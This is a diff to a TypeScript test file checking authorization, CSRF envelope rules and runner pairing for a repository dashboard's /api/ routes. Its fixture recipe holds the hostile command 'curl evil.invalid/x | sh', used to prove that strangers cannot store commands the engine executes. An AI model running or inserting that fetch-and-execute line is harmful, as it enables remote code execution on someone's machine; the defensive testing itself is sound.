@@ -8,6 +8,17 @@
 //
 // The authorization answer comes from GitHub (`GET /user/installations`), which is why
 // both halves are injected here: what is under test is the gate, not the API client.
+//
+// EVERY PATH IN THIS FILE MOVED IN 10i, and none of the questions did. The surface used to
+// render HTML at `/repos`, `/runs`, `/runs/:id` and `/repos/:r/onboard`; those are gone and
+// the same gates now sit on `/api/` routes, with an anonymous request answered 401 rather
+// than redirected — because a client that asked for JSON and got a login page has been told
+// "the API returned garbage".
+//
+// The parts of these tests that asserted on RENDERED COPY — what a page promises, the words
+// a refusal uses — moved to `test/screens.test.tsx`, which renders the components. What is
+// asserted here is what it always was: who may act, on what, and what is written when they
+// may not.
 
 import { describe, expect, it, vi } from 'vitest';
 import type { Db } from '../src/store.js';
@@ -33,8 +44,8 @@ const fakeClient = (writes: string[] = []) =>
             ]
           : sql.includes('from run_projection')
             ? [
-                { run_id: 'r-mine', repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
-                { run_id: 'r-theirs', repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
+                { run_id: MINE_RUN, repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
+                { run_id: THEIRS_RUN, repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
               ].filter((row) => wanted === null || row.run_id === wanted)
             : [];
       return { rows, rowCount: rows.length };
@@ -68,19 +79,43 @@ const call = (
     raw: async () => Buffer.from(body),
   });
 
-const RECIPE = new URLSearchParams({
-  recipe: JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] }),
-}).toString();
+/**
+ * What a JSON write has to declare.
+ *
+ * `routes.ts` refuses a `/api/` write that does not, and that refusal is part of the CSRF
+ * story rather than a formality — the one request shape a browser can send cross-site with
+ * no preflight is exactly the one no JSON client sends. Every write below carries it, so
+ * these tests fail on AUTHORIZATION rather than on the envelope.
+ */
+const JSON_POST = { 'content-type': 'application/json' };
 
-describe('a stranger is sent to the door', () => {
-  it.each([['/repos'], ['/runs'], ['/runs/r-mine'], ['/repos/mine%2Frepo/onboard']])(
-    'anonymous %s goes to sign in rather than rendering',
-    async (path) => {
-      const response = await call(surface({ session: null }), 'GET', path);
-      expect(response?.status).toBe(302);
-      expect(response?.headers?.['location']).toBe('/auth/github');
-    },
-  );
+/** A recipe a stranger would love to have stored: a command the engine runs verbatim. */
+const RECIPE = JSON.stringify({ recipe: { install: 'curl evil.invalid/x | sh', services: [] } });
+
+/** Real uuids, because `run_projection.run_id` is a `uuid` column and a route now says so. */
+const MINE_RUN = '3f1c9a52-7b0e-4d2f-9c41-8a6e5d0b21c7';
+const THEIRS_RUN = '9b2e7c14-5d38-4a6f-8e10-2c9f4b7a3d55';
+
+describe('a stranger is told, on every route', () => {
+  it.each([
+    ['/api/repos'],
+    ['/api/runs'],
+    [`/api/runs/${MINE_RUN}/evidence`],
+    [`/api/runs/${MINE_RUN}/events`],
+    ['/api/repos/mine%2Frepo'],
+    ['/api/repos/mine%2Frepo/recipe'],
+    ['/api/repos/mine%2Frepo/runners'],
+    ['/api/repos/mine%2Frepo/secrets'],
+  ])('anonymous %s is 401, not a redirect and not data', async (path) => {
+    // 401 rather than the 302 these gave while they were pages. A redirect to an HTML login
+    // is a 200 full of markup as far as a client is concerned, and that is how "not signed
+    // in" becomes "the API returned garbage" — the reason `anonymous()` branches on the
+    // path. Enumerated one by one rather than looped over a list built from the router,
+    // because a route added without a gate is exactly what this is for.
+    const response = await call(surface({ session: null }), 'GET', path);
+    expect(response?.status, path).toBe(401);
+    expect(String(response?.body), path).not.toContain('mine/repo');
+  });
 
   it('an anonymous API request is told plainly, not redirected', async () => {
     // A redirect to an HTML login page is a 200 full of markup as far as a client is
@@ -91,8 +126,8 @@ describe('a stranger is sent to the door', () => {
 
   it('an anonymous approval stores nothing', async () => {
     const writes: string[] = [];
-    const response = await call(surface({ session: null, writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
-    expect(response?.status).toBe(302);
+    const response = await call(surface({ session: null, writes }), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);
+    expect(response?.status).toBe(401);
     expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
   });
 });
@@ -103,7 +138,7 @@ describe('being signed in is not being allowed', () => {
     // this passes, the recipe is stored and the next run on that repository executes
     // `curl evil.invalid/x | sh` on somebody else's machine.
     const writes: string[] = [];
-    const response = await call(surface({ writes }), 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);
+    const response = await call(surface({ writes }), 'PUT', '/api/repos/theirs%2Frepo/recipe', RECIPE, JSON_POST);
 
     expect(response?.status).toBe(404);
     expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
@@ -113,30 +148,37 @@ describe('being signed in is not being allowed', () => {
     // The control. Without it the test above passes on a surface that refuses
     // everything, which is a working authorization check and a broken product.
     const writes: string[] = [];
-    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
+    const response = await call(surface({ writes }), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);
 
-    expect(response?.status).toBe(303);
+    expect(response?.status).toBe(200);
     expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
   });
 
-  it('the onboarding page of a repository you cannot see is not found', async () => {
-    const response = await call(surface(), 'GET', '/repos/theirs%2Frepo/onboard');
-    expect(response?.status).toBe(404);
-    // "Not connected", the same words an unknown repository gets. A stranger probing
-    // names learns nothing about which ones this service knows.
-    expect(String(response?.body)).toContain('is not connected');
+  it('a repository you cannot see is not found, in the same words an unknown one gets', async () => {
+    const theirs = await call(surface(), 'GET', '/api/repos/theirs%2Frepo');
+    const nobodys = await call(surface(), 'GET', '/api/repos/nobody%2Frepo');
+    expect(theirs?.status).toBe(404);
+    // Identical answers. A stranger probing names learns nothing about which repositories
+    // this service knows.
+    expect(String(theirs?.body)).toBe(String(nobodys?.body));
+    expect(String(theirs?.body)).toContain('not connected');
   });
 
-  it('the repository list shows theirs and not the other one', async () => {
-    const response = await call(surface(), 'GET', '/repos');
-    expect(String(response?.body)).toContain('mine/repo');
-    expect(String(response?.body)).not.toContain('theirs/repo');
+  it('the repository list carries theirs and not the other one', async () => {
+    const response = await call(surface(), 'GET', '/api/repos');
+    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
+    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
   });
 
-  it('a run belonging to another installation is not found', async () => {
-    const response = await call(surface(), 'GET', '/runs/r-theirs');
-    expect(response?.status).toBe(404);
-  });
+  it.each([['evidence'], ['events']])(
+    'a run belonging to another installation is not found (%s)',
+    async (leaf) => {
+      const response = await call(surface(), 'GET', `/api/runs/${THEIRS_RUN}/${leaf}`);
+      expect(response?.status).toBe(404);
+      // And it carries none of that run's data on the way out.
+      expect(String(response?.body)).not.toContain('theirs/repo');
+    },
+  );
 
   it('and the run list carries only what they may see', async () => {
     const response = await call(surface(), 'GET', '/api/runs');
@@ -154,7 +196,7 @@ describe('being signed in is not being allowed', () => {
       blobRoot: '/tmp/never-used-because-this-is-refused',
       auth: { session: async () => SESSION, installations: async () => [1] },
     });
-    const response = await call(route, 'POST', '/runs/r-theirs/forget');
+    const response = await call(route, 'POST', `/api/runs/${THEIRS_RUN}/forget`, '', JSON_POST);
 
     expect(response?.status).toBe(404);
     expect(writes.some((sql) => sql.includes('insert into forgotten'))).toBe(false);
@@ -166,7 +208,13 @@ describe('being signed in is not being allowed', () => {
     // any machine whose id it knew. The fake below records the SQL, and the assertion is
     // that the update is scoped rather than that it happened.
     const writes: string[] = [];
-    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/runners/somebody-elses-id/revoke');
+    const response = await call(
+      surface({ writes }),
+      'POST',
+      '/api/repos/mine%2Frepo/runners/somebody-elses-id/revoke',
+      '',
+      JSON_POST,
+    );
 
     // Nothing matched, so nothing was revoked, and the answer is the one a runner that
     // does not exist gets.
@@ -191,9 +239,10 @@ describe('being signed in is not being allowed', () => {
     const writes: string[] = [];
     const response = await call(
       surface({ installations: [], writes }),
-      'POST',
-      '/repos/mine%2Frepo/onboard',
+      'PUT',
+      '/api/repos/mine%2Frepo/recipe',
       RECIPE,
+      JSON_POST,
     );
     expect(response?.status).toBe(404);
     expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
@@ -355,21 +404,29 @@ describe('starting a run is a write, and gated like one', () => {
     // onboarding block had none, so a `PUT /repos/:repo/onboard` fell into "THE ONE
     // WRITE" and stored shell commands the engine executes verbatim. Not reachable
     // cross-site, and a second door onto the highest-privilege write in this surface.
-    for (const method of ['PUT', 'DELETE'] as const) {
+    // The form route is gone with `src/web.ts`, and the write is a `PUT` with a JSON body —
+    // so the question this test asks has inverted: it is no longer "does an unexpected verb
+    // fall into the write" but "does an unexpected ENVELOPE". A form post is the one shape a
+    // browser can send cross-site with no preflight, and it must not reach this write
+    // whatever verb carries it.
+    for (const method of ['POST', 'PUT'] as const) {
       const writes: { sql: string; params: unknown[] }[] = [];
-      const response = await call(trigger(writes), method, '/repos/mine%2Frepo/onboard', RECIPE, {
+      const response = await call(trigger(writes), method, '/api/repos/mine%2Frepo/recipe', RECIPE, {
         'content-type': 'application/x-www-form-urlencoded',
       });
-      expect(response).toBeNull();
+      expect(response?.status, method).toBe(415);
       expect(writes.filter((w) => w.sql.includes('insert into recipes'))).toHaveLength(0);
     }
-    // THE positive control: the verb that IS the write still works, so this is not a
-    // surface that refuses everything.
+    // And the paths the write used to live at answer nothing at all, so the bundle serves
+    // them — there is no second door left open behind the one that moved.
+    for (const method of ['GET', 'POST', 'PUT', 'DELETE'] as const) {
+      expect(await call(trigger([]), method, '/repos/mine%2Frepo/onboard', RECIPE, JSON_POST), method).toBeNull();
+    }
+    // THE positive control: the verb and envelope that ARE the write still work, so this is
+    // not a surface that refuses everything.
     const writes: { sql: string; params: unknown[] }[] = [];
-    const stored = await call(trigger(writes), 'POST', '/repos/mine%2Frepo/onboard', RECIPE, {
-      'content-type': 'application/x-www-form-urlencoded',
-    });
-    expect(stored?.status).toBe(303);
+    const stored = await call(trigger(writes), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);
+    expect(stored?.status).toBe(200);
     expect(writes.filter((w) => w.sql.includes('insert into recipes'))).toHaveLength(1);
   });
 
@@ -462,9 +519,9 @@ describe('the local surface is unchanged', () => {
     // required a GitHub login to use your own laptop.
     const writes: string[] = [];
     const local = dashboardRoutes({ client: fakeClient(writes), installUrl: 'https://example.invalid' });
-    const response = await call(local, 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);
+    const response = await call(local, 'PUT', '/api/repos/theirs%2Frepo/recipe', RECIPE, JSON_POST);
 
-    expect(response?.status).toBe(303);
+    expect(response?.status).toBe(200);
     expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
   });
 });
@@ -504,21 +561,23 @@ describe('the landing page asks who you are', () => {
     expect(response?.headers?.location).toBe('/repos');
   });
 
-  it('a signed-out visitor gets the landing page WITH a way in', async () => {
-    const response = await call(surface({ session: null }), 'GET', '/');
-
-    expect(response?.status).toBe(200);
-    expect(response?.body).toContain('href="/auth/github"');
+  it('a signed-out visitor is not redirected — the bundle answers', async () => {
+    // `null`, so `staticRoutes` serves the landing page. The route still EXISTS only for
+    // the redirect above: the bundle could make the same decision from `/api/me`, but it
+    // would paint the marketing page first and replace it, so every signed-in visitor to
+    // the front door would see it flash past.
+    //
+    // Whether that page offers a way in is `test/screens.test.tsx`'s question now — it is a
+    // property of the component, and it is asserted there in both directions.
+    expect(await call(surface({ session: null }), 'GET', '/')).toBeNull();
   });
 
-  it('and locally, where there is no login, the landing page offers none', async () => {
-    // The original reason the line was written the way it was, and it still holds:
-    // one operator on 127.0.0.1, and a sign-in button would lead nowhere.
+  it('and locally, where there is no login, the front door is the same', async () => {
+    // One operator on 127.0.0.1. `auth` absent means `session()` is never called, so there
+    // is nobody to redirect and the bundle answers — which then asks `/api/me`, is told
+    // there are no accounts, and shows the application rather than a pitch.
     const local = dashboardRoutes({ client: fakeClient(), installUrl: 'https://example.invalid' });
-    const response = await call(local, 'GET', '/');
-
-    expect(response?.status).toBe(200);
-    expect(response?.body).not.toContain('href="/auth/github"');
+    expect(await call(local, 'GET', '/')).toBeNull();
   });
 
   it('asks who you are without asking what you own', async () => {
@@ -546,35 +605,43 @@ describe('the landing page asks who you are', () => {
  * credential was "download a stranger's package and execute it, with this token already in
  * your environment".
  */
-describe('the pairing command names this service and nothing off the internet', () => {
+describe('the pairing answer names this service and nothing off the internet', () => {
+  // The COMMAND moved to `test/screens.test.tsx` with the screen that prints it — `npm run
+  // runner` rather than an `npx` of a package that is not ours, and the sentence about
+  // shell history. What stays here is the part the server decides: the URL the machine has
+  // to dial, which the page can only print because this route worked it out.
   const mint = (headers: Record<string, string> = {}) =>
-    call(surface(), 'POST', '/repos/mine%2Frepo/runners', 'name=laptop', headers);
+    call(surface(), 'POST', '/api/repos/mine%2Frepo/runners', JSON.stringify({ name: 'laptop' }), {
+      ...JSON_POST,
+      ...headers,
+    });
 
-  it('never tells anyone to npx a package that is not ours', async () => {
-    const response = await mint();
-    // The specific hazard, pinned by name: `npx` plus a bare package name on this page
-    // is remote code execution on the operator's machine, invited by us.
-    expect(response?.body).not.toContain('npx tf-runner');
-    expect(response?.body).toContain('npm run runner');
-  });
+  const planeUrl = async (headers: Record<string, string> = {}) =>
+    (JSON.parse(String((await mint(headers))?.body)) as { planeUrl: string }).planeUrl;
 
   it('prints the origin the operator is reading, not a placeholder', async () => {
-    const response = await mint({ host: 'plane.example.dev', 'x-forwarded-proto': 'https' });
-
-    expect(response?.body).toContain('ENGINE_PLANE_URL=https://plane.example.dev');
-    expect(response?.body).not.toContain('&lt;this service&gt;');
+    // This route once answered with the literal string `<this service>`, served from the
+    // host it should have been naming.
+    expect(await planeUrl({ host: 'plane.example.dev', 'x-forwarded-proto': 'https' })).toBe(
+      'https://plane.example.dev',
+    );
   });
 
   it('trusts x-forwarded-proto, because the plane speaks plain HTTP behind a terminator', async () => {
-    // Trusting the socket would print `http://` for an `https://` deployment, and a
-    // runner dialling that gets a redirect it does not follow.
-    const response = await mint({ host: 'plane.example.dev' });
-    expect(response?.body).toContain('https://plane.example.dev');
+    // Trusting the socket would print `http://` for an `https://` deployment, and a runner
+    // dialling that gets a redirect it does not follow.
+    expect(await planeUrl({ host: 'plane.example.dev' })).toBe('https://plane.example.dev');
   });
 
   it('and stays http on a laptop, where there is no terminator and no certificate', async () => {
-    const response = await mint({ host: '127.0.0.1:8788' });
-    expect(response?.body).toContain('ENGINE_PLANE_URL=http://127.0.0.1:8788');
+    expect(await planeUrl({ host: '127.0.0.1:8788' })).toBe('http://127.0.0.1:8788');
+  });
+
+  it('hands the token over exactly once, and never again', async () => {
+    const minted = JSON.parse(String((await mint({ host: '127.0.0.1:8788' }))?.body)) as { token: string };
+    expect(minted.token).toMatch(/\S/);
+    const listed = await call(surface(), 'GET', '/api/repos/mine%2Frepo/runners');
+    expect(String(listed?.body)).not.toContain(minted.token);
   });
 });
 
@@ -591,65 +658,43 @@ describe('the pairing command names this service and nothing off the internet', 
  * `mode` is explicit rather than inferred from whether login is configured, because those
  * are two different questions — the conflation the landing page already had once.
  */
-describe('a page promises only what its deployment can do', () => {
-  /** Installed, but nothing has run: the state every one of these pages is about. */
-  const noRunsYet = () =>
-    ({
-      query: vi.fn(async (sql: string) => {
-        const rows = sql.includes('from installations')
-          ? [{ repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null }]
-          : [];
-        return { rows, rowCount: rows.length };
-      }),
-    }) as unknown as Db;
+/**
+ * What a deployment may promise is still decided here, and said elsewhere.
+ *
+ * `mode` used to change the words on a rendered page — "draft a recipe" locally, "write a
+ * recipe" on a plane that drafts nothing — and those assertions moved to
+ * `test/screens.test.tsx` with the component that prints them. What did not move is the
+ * decision: `mode` is a fact about the deployment, and `/api/me` is where the UI learns it.
+ *
+ * The default matters most. It is `plane`, the more restricted one, so a deployment that
+ * forgot to say offers less than it can rather than promising drafting that will never
+ * happen.
+ */
+describe('a deployment reports only what it can do', () => {
+  const me = async (options: Parameters<typeof surface>[0] = {}) =>
+    JSON.parse(String((await call(surface(options), 'GET', '/api/me'))?.body)) as {
+      mode: string;
+      accounts: boolean;
+      signedIn: boolean;
+      github: boolean;
+      forgetting: boolean;
+    };
 
-  const page = async (path: string, mode?: 'local' | 'plane') =>
-    (
-      await call(
-        dashboardRoutes({
-          client: noRunsYet(),
-          installUrl: 'https://example.invalid',
-          ...(mode === undefined ? {} : { mode }),
-          auth: { session: async () => SESSION, installations: async () => [1] },
-        }),
-        'GET',
-        path,
-      )
-    )?.body as string;
-
-  it('does not offer to draft a recipe where nothing drafts', async () => {
-    const body = await page('/repos', 'plane');
-    expect(body).toContain('write a recipe');
-    expect(body).not.toContain('draft a recipe');
+  it('defaults to the restricted mode, so one that forgot to say promises less', async () => {
+    expect((await me()).mode).toBe('plane');
   });
 
-  it('still offers drafting on a laptop, where installing one starts a drafting run', async () => {
-    const body = await page('/repos', 'local');
-    expect(body).toContain('draft a recipe');
+  it('says when there is no App, because the picker and Start both 501 without one', async () => {
+    expect((await me()).github).toBe(false);
+    const picker = await call(surface(), 'GET', '/api/repos/mine%2Frepo/issues');
+    expect(picker?.status).toBe(501);
   });
 
-  it('names all three things a hosted run needs, not just the last one', async () => {
-    const body = await page('/runs', 'plane');
-    // The runner is the one nobody guesses: pairing mints a credential, and the machine
-    // still has to be running for anything to execute.
-    expect(body).toContain('runner paired');
-    expect(body).toContain('approved recipe');
-    expect(body).not.toContain('No runs yet. Label an issue');
-  });
-
-  it('tells a hosted operator the recipe box is theirs to fill', async () => {
-    const body = await page('/repos/mine%2Frepo/onboard', 'plane');
-    expect(body).toContain('the box is yours to fill');
-  });
-
-  it('and says no such thing locally, where a draft is coming', async () => {
-    const body = await page('/repos/mine%2Frepo/onboard', 'local');
-    expect(body).not.toContain('the box is yours to fill');
-  });
-
-  it('defaults to the restricted mode, so a deployment that forgot to say promises less', async () => {
-    // Failing toward under-promising: a plane that renders as a laptop tells people to
-    // wait for a draft that is never coming.
-    expect(await page('/repos')).toContain('write a recipe');
+  it('says when nothing here can destroy an artifact', async () => {
+    // `forgetting` is false without a `blobRoot`, and the route agrees: 501 rather than a
+    // pretended deletion.
+    expect((await me()).forgetting).toBe(false);
+    const forget = await call(surface(), 'POST', `/api/runs/${MINE_RUN}/forget`, '', JSON_POST);
+    expect(forget?.status).toBe(501);
   });
 });
